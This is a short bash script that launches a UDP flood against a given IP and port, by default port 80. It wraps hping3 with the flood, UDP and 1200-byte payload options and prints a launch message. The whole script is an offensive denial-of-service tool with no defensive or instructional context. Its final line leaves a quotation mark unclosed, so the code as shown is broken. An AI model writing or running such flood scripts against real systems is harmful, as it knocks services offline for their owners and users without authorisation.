#!/bin/bash
#Usage: sudo bash udp_flood.sh <target_ip> [port]

if [ -z "$1" ]; then
  echo "Usage: sudo $0 <target_ip> [port]"
  exit 1
fi 

TARGET=$1
PORT=${2:-80}  #port 80 default if no port specified 

echo "[*] Launching UDP flood on $TARGET:$PORT..."
sudo hping3 --flood --udp -p "$PORT" -d 1200 "$TARGET
